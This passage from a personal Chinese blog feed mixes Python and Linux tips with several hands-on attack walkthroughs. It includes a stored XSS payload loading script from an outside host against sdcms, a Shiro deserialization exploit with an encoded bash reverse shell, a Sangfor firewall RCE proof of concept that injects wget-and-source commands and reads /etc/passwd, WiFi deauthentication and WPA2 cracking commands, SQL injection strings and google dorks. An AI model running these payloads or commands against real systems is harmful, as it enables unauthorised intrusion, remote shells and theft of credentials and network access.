    <url>/2020/02/16/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A4%B1%E8%B4%A5%EF%BC%8C%E4%B8%80%E7%9B%B4%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12316801.html">源地址：https://www.cnblogs.com/This-is-Y/p/12316801.html<i class="fas fa-external-link-alt"></i></a></p>
<p>在学python多线程的时候，照着网上的代码，一模一样的！！别人多线程，我一直单线程，很离谱。</p>
<p>代码如下</p>
<p>但是结果却是按顺序，按部就班的出来</p>
<img src="1503868-20200216133128039-1338398671.png" alt width="679" height="235">

<p> </p>
<p> 在找了很多东西之后，在简书发现一篇帖子：<a class="link" href="https://www.jianshu.com/p/79372add4c45">https://www.jianshu.com/p/79372add4c45<i class="fas fa-external-link-alt"></i></a></p>
<p>然后，我照着改了一下，发现还真是。在设置线程的语句里，target的值不要加括号</p>
<p>在做了这样的小修改后，运行程序，可以按预期的来</p>
<img src="1503868-20200216144337047-734621201.png" alt>

<p> </p>
<p> </p>
<p> </p>
<p>———2021.3.12更新————</p>
<p><a class="link" href="https://www.cnblogs.com/bakaft/">BakaFT<i class="fas fa-external-link-alt"></i></a>老哥回复了关于解决函数参数的问题，但是还有一个细节要注意</p>
<p> 添加参数最好使用[]而不是()，虽然俩个方式都可以用。</p>
<p> 输出</p>
<img src="1503868-20210312214442780-357570502.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>但是当函数只有一个参数时，结果就不一样了</p>
<p> 结果：</p>
<img src="1503868-20210312214619081-1147214963.png" alt loading="lazy">

<p> </p>
<p> 报错了  <strong>argument after * must be an iterable, not int</strong></p>
<p>因为如果使用()来传递参数，要这样子</p>
<p> <strong>如果只有一个参数，逗号也不能省略</strong></p>
<p> 所以还是推荐使用[]</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>python爬虫使用lxml解析数据编码乱码问题</title>
    <url>/2020/07/28/python%E7%88%AC%E8%99%AB%E4%BD%BF%E7%94%A8lxml%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13390506.html">源地址：https://www.cnblogs.com/This-is-Y/p/13390506.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>问题状况：</strong></p>
<p>可以正常获取数据，但是结果是</p>
<p>å·²éªè¯ å®å¨ ç¾ç</p>
<p>这样子的乱码</p>
<p><strong>解决方法：</strong></p>
<p>这边的UTF-8根据网页编码情况而定</p>
<p>看网页编码情况</p>
<p>F12</p>
<img src="1503868-20200728124650294-196621426.png" alt loading="lazy">

<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>python的if __name__==&#39;__main__&#39;的作用</title>
    <url>/2020/02/17/python%E7%9A%84if%20__name__==&#39;__main__&#39;%E7%9A%84%E4%BD%9C%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12322268.html">源地址：https://www.cnblogs.com/This-is-Y/p/12322268.html<i class="fas fa-external-link-alt"></i></a></p>
<p>学的比较浅显，目前只知道这一种作用</p>
<p>在一个python文件中使用if <strong>name</strong>==’<strong>main</strong>‘:这个语句是看不出明显效果的</p>
<p>但当你在另外一个python文件中import一个未使用if <strong>name</strong>==’<strong>main</strong>‘:的python文件时，会将这个文件执行一遍。</p>
<p>而如果是import一个使用了 if <strong>name</strong>==’<strong>main</strong>‘: 语句的python文件，则不会执行主动执行这个python文件。</p>
<p> </p>
<p>简单示例一下：</p>
<p>建立了3个文件，t1,t2,t3,其中</p>
<p>t1：</p>
<p>t2：</p>
<p>t3</p>
<p>最后运行的结果：</p>
<img src="1503868-20200217163527179-1380410819.png" alt>

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>sdcms-qing 代码审计</title>
    <url>/2023/07/03/sdcms-qing-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h1><p>漏洞点在f.php文件中的getip函数里</p>
<p><img src="image-20230703151241964.png" alt="image-20230703151241964"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#getip函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"><span class="variable">$type</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$ip</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>])) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ALI_CDN_REAL_IP&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ALI_CDN_REAL_IP&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$arr</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ip</span>==<span class="string">&#x27;&#x27;</span> || strpos(<span class="variable">$ip</span>,<span class="string">&quot;:&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$long</span>=sprintf(<span class="string">&quot;%u&quot;</span>,ip2long(<span class="variable">$ip</span>));</span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$long</span>?<span class="variable">$ip</span>:<span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> enhtml(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这边会通过判断HTTP_X_REAL_IP这些参数是否存在从而设置ip，但是这些是可以伪造的。这里我用的是X-Forwarded-For伪造HTTP_X_FORWARDED_FOR</p>
<p>由于会过滤‘和“，所以payload中不能出现这两个字符，这里我直接用的payload为：</p>
<ul>
<li>X-Forwarded-For: 2<script src="//xms.la/xxxxx"></script></li>
</ul>
<p>请求包截图：</p>
<p><img src="image-20230703153607031.png" alt="image-20230703153607031"></p>
<p>网站：</p>
<p><img src="image-20230703153641924.png" alt="image-20230703153641924"></p>
<p>反连平台：</p>
<p><img src="image-20230703153748169.png" alt="image-20230703153748169"></p>
<p>捕获的网页截图</p>
<p><img src="image-20230703153812875.png" alt="image-20230703153812875"></p>
]]></content>
  </entry>
  <entry>
    <title>shiro漏洞利用_入门</title>
    <url>/2020/10/29/shiro%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8_%E5%85%A5%E9%97%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13899977.html">源地址：https://www.cnblogs.com/This-is-Y/p/13899977.html<i class="fas fa-external-link-alt"></i></a></p>
<p>拿到站点后发现是tomcat的，找了一圈找不到点进去，给学长看了一下，似乎是有个shiro可以利用</p>
<p>于是乎就去临时学习了一下</p>
<p>参考bypass的博客：<a class="link" href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html<i class="fas fa-external-link-alt"></i></a></p>
<p>1、java -jar .\shiro_tool.jar url</p>
<p>检测结果</p>
<img src="1503868-20201029233728956-50603251.png" alt loading="lazy">

<p> 2、服务器监听一个端口50058，这个是拿来反弹shell的</p>
<p>nc -lvnp 50058</p>
<p>反弹shell 命令：bash -i &gt;&amp; /dev/tcp/39.99.xx.xx/50058 0&gt;&amp;1<br>利用网站<a class="link" href="http://www.jackson-t.ca/runtime-exec-payloads.html%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81%EF%BC%9Abash">http://www.jackson-t.ca/runtime-exec-payloads.html对命令进行编码：bash<i class="fas fa-external-link-alt"></i></a> -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45OS4xOTIuMjAvNTAwNT这是马赛克==}|{base64,-d}|{bash,-i}</p>
<p>3、使用这个大佬的工具：<a class="link" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit<i class="fas fa-external-link-alt"></i></a></p>
<p>在服务器上新建一个ssh会话，执行java -cp ysoserial.jar ysoserial.exploit.JRMPListener 50057 CommonsCollections4 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45OS4xOTIuMjAvNTAwNT这是马赛克==}|{base64,-d}|{bash,-i}’</p>
<p>这个端口50057是用来监听并反弹shell的，反弹到刚刚的50058端口上</p>
<img src="1503868-20201029234700637-1805204575.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p>4、准备一个shiro.py，代码如下。用来构造数据包</p>
<p>执行python shiro.py 39.99.xx.xx:50057</p>
<p>这里选择的端口是执行jar文件监听的端口，而不是用nc监听的那个</p>
<p>生成数据包</p>
<img src="1503868-20201029234840493-1341707442.png" alt loading="lazy">

<p> </p>
<p> 用bp在网站登陆页面抓个包，在cookie中添加构造的参数，发送。可以看到响应包中有一个deleteme</p>
<img src="1503868-20201029235216646-1465269198.png" width="1100" loading="lazy">

<p> </p>
<p> 这时候在50057可以看到东西，</p>
<img src="1503868-20201029235502467-1518669748.png" alt loading="lazy">

<p> </p>
<p> 同时在50058可以看到shell回来了（可能有点延迟。建议等一会）</p>
<img src="1503868-20201029235522381-119610881.png" alt loading="lazy">

<p> </p>
<p> 直接就是root权限</p>
<img src="1503868-20201029235535203-584151072.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p><br><br> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入笔记</title>
    <url>/2021/11/17/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>注入点假定为：id=’) UNION ALL SELECT 1,2,3 –+</p>
<p>查询secure_file_priv：<br>    UNION ALL SELECT NULL,(select @@global.secure_file_priv),NULL</p>
<p>查询慢查询日志文件是否开启：</p>
<p>查询慢查询日志文件路径：<br>    UNION ALL SELECT NULL,(select @@global.slow_query_log_file),NULL –+</p>
]]></content>
  </entry>
  <entry>
    <title>sxf - ngfw - rce</title>
    <url>/2023/08/11/sxf-ngfw-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>原文地址：<a class="link" href="https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/">https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/<i class="fas fa-external-link-alt"></i></a></p>
<p>fofa指纹：”Redirect.php?url=/LogInOut.php” &amp;&amp; port=”85”</p>
<p><img src="image-20231009151045689.png" alt="image-20231009151045689"></p>
<h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:85</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>asdf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>关键点在与Content-Length: asdf，如果返回413,则可能存在问题，我从fofa中提取了10000个ip，只有500多个有这个特征，需要注意的是，如果使用burp验证，需要在上面的Repeater菜单栏中，把Update Content-Length取消</p>
<p><img src="image-20231009151127329.png" alt="image-20231009151127329"></p>
<p><img src="image-20231009151426357.png" alt="image-20231009151426357"></p>
<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vmp_getinfo</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> xxx.xxx.xxx.xxx:85</span><br><span class="line"><span class="attribute">y-forwarded-for</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>验证失败，本来应该是这样的</p>
<p><img src="image-20231009151709308.png" alt="image-20231009151709308"></p>
<p>但是我跑了这么多ip，一个都没成功</p>
<h2 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/svpn_html/loadfile.php?file=/etc/./passwd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:85</span><br><span class="line"><span class="attribute">x-forwarded-for</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同上，这个也失败了，文章中是可以读文件的</p>
<p><img src="image-20231009152816862.png" alt="image-20231009152816862"></p>
<h2 id="POC4"><a href="#POC4" class="headerlink" title="POC4"></a>POC4</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/LogInOut.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:85</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=2e01d2ji93utnsb5abrcm780c2</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>622</span><br><span class="line"></span><br><span class="line">type=logged&amp;un=watchTowr;wget%20http://vps:8888/cmd.txt;source%20/virus/dcweb/webapps/cmd.txt&amp;up=0f2df0a6f151e836c8ccd1c2ea3bfbdfb7bfa0d38d438942492bd8f28f3e92939319f932f2f2add6d0d484accdc4c28269b203c4dc77c1da941fa19dae017d44d6ea8cad2572e37c485a8ebcb4bdb510cc86420a50ae45ae07daf5fe9c40fe133f3806cd8f3158ee359766e8e19c9fbbf7e888bf0d7f3952f4d083bd17cd19eb960dadec2835f6f259616f5b2e5942d3a4d1754cbd69696fae60ef18358bf5782dd5ebf377f5642e0583e630660ccac241a615ae21bfc12852a32d0367a899eb010e5d1c33669fc2e9ea3a0ecbf078c22120196a115b4038288063bf99610d3d331acb53e5c8fbd14229a4abdff83cf075a7b97a9bb9dae3586f19256f4262d5</span><br></pre></td></tr></table></figure>

<p><img src="image-20231009152709691.png" alt="image-20231009152709691"></p>
<p>这个本来也差点全失败了，burp的HTTP Response没有回显，返回在打算关掉窗口时，看了一眼shell窗口，发现居然有信息</p>
<p><img src="image-20231009152629901.png" alt="image-20231009152629901"></p>
<p>又测试了一下dnslog，可以</p>
<p><img src="image-20231009154542328.png" alt="image-20231009154542328"></p>
<p>接下来测试一下反弹shell</p>
]]></content>
  </entry>
  <entry>
    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
<p>按下win键，输入语言，打开语言设置。</p>
<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">

<p> </p>
<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">

<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">

<p> </p>
<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
<p> gogogo</p>
<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu设置u盘及机械硬盘</title>
    <url>/2023/08/13/ubuntu%E8%AE%BE%E7%BD%AEu%E7%9B%98%E5%8F%8A%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<h1 id="u盘无法写入文件"><a href="#u盘无法写入文件" class="headerlink" title="u盘无法写入文件"></a>u盘无法写入文件</h1><p>确定u盘的文件系统</p>
<ul>
<li>df -h</li>
</ul>
<p><img src="image-20231011094950791.png" alt="image-20231011094950791"></p>
<p>我的是<code>/dev/sdc1</code>记住这个，然后卸载u盘，不要拔掉</p>
<ul>
<li>sudo umount /media/this_is_y/THIS_IS_Y</li>
</ul>
<p>随后修复u盘</p>
<ul>
<li>sudo dosfsck -v -a /dev/sdc1</li>
</ul>
<p><img src="image-20231011095141705.png" alt="image-20231011095141705"></p>
<p>ok，之后拔掉u盘再插上就可以了，或者手动挂载</p>
<h1 id="挂载硬盘"><a href="#挂载硬盘" class="headerlink" title="挂载硬盘"></a>挂载硬盘</h1><ol>
<li>列出硬盘</li>
</ol>
<ul>
<li>sudo fdisk -l</li>
</ul>
<p><img src="image-20231011094303028.png" alt="image-20231011094303028"></p>
<p>​        找到需要挂载的硬盘，<code>/dev/sdb</code></p>
<ol start="2">
<li>先格式化成ext4 </li>
</ol>
<ul>
<li>sudo mkfs -t ext4 /dev/sda </li>
</ul>
<ol start="3">
<li>再挂载到自己定义的文件夹 </li>
</ol>
<ul>
<li>sudo mkdir /home/D </li>
<li>sudo mount -t ext4 /dev/sdb /home/D</li>
</ul>
<p><img src="image-20231011094525560.png" alt="image-20231011094525560"></p>
<ol start="4">
<li>修改挂载硬盘文件夹的owner</li>
</ol>
<ul>
<li>ls -al /home</li>
<li>group this_is_y</li>
<li>sudo chown -R  this_is_y:this_is_y /home/D</li>
</ul>
<p><img src="image-20231011094652818.png" alt="image-20231011094652818"></p>
]]></content>
  </entry>
  <entry>
    <title>wifi密码破解</title>
    <url>/2020/11/29/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14057260.html">源地址：https://www.cnblogs.com/This-is-Y/p/14057260.html<i class="fas fa-external-link-alt"></i></a></p>
<p>iwconfig查看网卡</p>
<img src="1503868-20201129154518778-1574820977.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 启动监听模式，设置信道</p>
<p> ifconfig wlan0 down<br> iwconfig wlan0 mode Monitor<br> ifconfig wlan0 up<br> iwconfig wlan0 channel 10<br><br><img src="1503868-20201129154720336-1280924505.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> airodump-ng wlan0扫描周边热点</p>
<p>找疾风剑豪这个<br><img src="1503868-20201129161602687-1312486283.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p> 得到MAC地址</p>
<p>2E:15:E1:28:56:08 </p>
<p> </p>
<p>准备抓握手包（需要有人连上了目标wifi，把他踢下线，在他重新连接的时候进行抓包操作）</p>
<p>airodump-ng -c 3 –bssid 2E:15:E1:28:56:08  -w /root/WPA2/yasuo wlan0<br>airodump-ng -c 3(信道) –bssid 2E:15:E1:28:56:08(目标wifiMAC地址) -w /root/WPA2/527(握手包保存地址) wlan0(工作的网卡)</p>
<p><strong>注意，-c参数不能丢，不然后续踢人下线的时候，会出现这个问题</strong></p>
<img src="1503868-20201129161701556-94134618.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p>等待一段时间，下面表示有5个人练了这个wifi</p>
<img src="1503868-20201129161804334-1427527166.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> 找一个幸运儿，踢他下线</p>
<p>aireplay-ng -0 5 -a 2E:15:E1:28:56:08 -c 28:3A:4D:0B:6C:91  wlan0<br>aireplay-ng -0 5(发送断开连接包的数量) -a 2E:15:E1:28:56:08(wifi的MAC地址) -c 28:3A:4D:0B:6C:91(幸运儿的设备MAC地址)  wlan0(工作网卡)</p>
<img src="1503868-20201129161834629-1843982876.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> 一般来说断开一两次就可以抓到包，偶尔脸黑抓不到，就换一个人踢，</p>
<p>抓到包后，在airdump-ng这里可以看到</p>
<img src="1503868-20201129162308642-468239503.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>然后就是爆破了</p>
<p>aircrack-ng -w /root/wifi_password_dir/xato-net-10-million-passwords.txt yasuo-02.cap<br>aircrack-ng -w 字典位置 握手包位置</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>总结一下就是，</p>
<p>启动：</p>
<p> ifconfig wlan0 down<br> iwconfig wlan0 mode Monitor<br> ifconfig wlan0 up<br> iwconfig wlan0 channel 10</p>
<p>扫描：</p>
<p>　　airodump-ng wlan0</p>
<p>抓包：<br>　　airodump-ng -c 3(信道) –bssid 2E:15:E1:28:56:08(目标wifiMAC地址) -w /root/WPA2/527(握手包保存地址) wlan0(工作的网卡)</p>
<p>　　踢人：　　</p>
<p>　　　　aireplay-ng -0 5(发送断开连接包的数量) -a 2E:15:E1:28:56:08(wifi的MAC地址) -c 28:3A:4D:0B:6C:91(幸运儿的设备MAC地址)  wlan0(工作网卡)</p>
<p>爆破：<br>　　aircrack-ng -w 字典位置 握手包位置</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>xp面板xss(搭配定时任务rce)</title>
    <url>/2023/02/08/xp%E9%9D%A2%E6%9D%BFxss-%E6%90%AD%E9%85%8D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1rce-This-is-Y/</url>
    <content><![CDATA[<p>我先去装个win虚拟机</p>
<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/5w4yE3xX-Ep72O6GJy569g">https://mp.weixin.qq.com/s/5w4yE3xX-Ep72O6GJy569g<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>windows下安装sdkman</title>
    <url>/2021/12/13/windows%E4%B8%8B%E5%AE%89%E8%A3%85sdkman-This-is-Y/</url>
    <content><![CDATA[<p>参考：<a class="link" href="https://www.jianshu.com/p/ddce36a50720">https://www.jianshu.com/p/ddce36a50720<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.codenong.com/38782928/">https://www.codenong.com/38782928/<i class="fas fa-external-link-alt"></i></a></p>
<p>官网给了三种在win下安装sdkman的安装方式</p>
<ol>
<li>第一个解决方案包括在尝试安装SDKMAN之前安装Windows子系统用于Linux (WSL)。您需要一个基本的工具链，包括bash、zip、unzip和curl(特殊情况下需要tar和gzip)。很有可能它会在盒子外工作。</li>
<li>另一种解决方案涉及在尝试SDKMAN安装之前安装CYGWIN。对于我们的软件功能，我们要求使用与WSL描述的具有相同的工具链安装Cygwin。</li>
<li>第三种解决方案是使用Git Bash进行Windows环境的Git用户。为了使这个工作，环境需要补充Mingw以将必要的工具链添加到功能。</li>
</ol>
<p>因为写博客用的就是gitbash提交的，所以直接用第三种<br>先确定这几个东西都有没有安装好<br>    curl<br>    zip<br>    uzip<br>    sed    </p>
<p>一般来说，除了zip，其他三个应该是都自动配置好了的<br>然后说一下zip怎么设置，我是自己电脑使用的7z，找到7z的安装目录，我的是d:/7-zip<br>然后打开gitbash，来到**/mingw64/bin**目录下</p>
<p><img src="image-20211213164405508.png" alt="image-20211213164405508"></p>
<p>直接一个软连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &quot;&#x2F;d&#x2F;7-Zip&#x2F;7z.exe&quot; zip</span><br></pre></td></tr></table></figure>
<p>然后就好了，实测是可以用的<br><img src="image-20211213164644717.png" alt="image-20211213164644717"></p>
<p>然后就是下载安装，多试几次，不要挂节点（我试了快10次）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s &quot;https:&#x2F;&#x2F;get.sdkman.io&quot; | bash</span><br><span class="line">source &quot;$HOME&#x2F;.sdkman&#x2F;bin&#x2F;sdkman-init.sh&quot;</span><br><span class="line"></span><br><span class="line">测试是否安装成功</span><br><span class="line">sdk version</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>google hacking常用</title>
    <url>/2021/07/10/%E2%80%9Cgoogle-hacking%E5%B8%B8%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<ul>
<li>搜索特殊的文件后缀<table>
<thead>
<tr>
<th align="left">搜索内容</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">site:xxxx.com inurl:jsp.bak</td>
<td>搜索站点中是否存在后缀为jsp.bak的文件，即，某些jsp的备份文件。</td>
</tr>
<tr>
<td align="left">site:xxxx.com inurl:log</td>
<td>搜索站点中是否存在应用程序日志文件，如ftp日志、oracle日志等</td>
</tr>
<tr>
<td align="left">site:xxxx.com filetype:sql</td>
<td>搜索站点中是否存在SQL脚本文件</td>
</tr>
<tr>
<td align="left">site:xxxx.com filetype:txt</td>
<td>查找站点中是否有包含敏感信息的txt文件</td>
</tr>
<tr>
<td align="left">site:xxxx.com filetype:conf</td>
<td>查找站点中是否有包含敏感信息的conf文件</td>
</tr>
</tbody></table>
</li>
</ul>
<ul>
<li>查找第三方组件或程序<table>
<thead>
<tr>
<th>搜索内容</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>site:xxxx.com inurl:/fckeditor/</td>
<td>搜索站点是否使用了fckeditor</td>
</tr>
<tr>
<td>site:xxxx.com inurl:ewebeditor</td>
<td>搜索站点是否使用了 ewebeditor</td>
</tr>
</tbody></table>
</li>
</ul>
<ul>
<li>搜索错误的配置</li>
</ul>
<table>
<thead>
<tr>
<th>搜索内容</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>site:xxxx.com intitle:”index of /”</td>
<td>搜索站点是否使用了列目录功能</td>
</tr>
<tr>
<td>site:xxxx.com inurl:”examples”</td>
<td>搜索站点中是否存在测试代码</td>
</tr>
</tbody></table>
<ul>
<li>搜索管理后台<table>
<thead>
<tr>
<th>搜索内容</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>site:xxxx.com inurl:admin</td>
<td></td>
</tr>
<tr>
<td>site:xxxx.com inurl:login</td>
<td></td>
</tr>
<tr>
<td>site:xxxx.com inurl:manage</td>
<td>搜索站点是否对外开放了管理后台</td>
</tr>
<tr>
<td>site:xxxx.com inurl:system</td>
<td></td>
</tr>
<tr>
<td>site:xxxx.com inurl:console</td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>《我与地坛》</title>
    <url>/2023/02/12/%E3%80%8A%E6%88%91%E4%B8%8E%E5%9C%B0%E5%9D%9B%E3%80%8B-This-is-Y/</url>
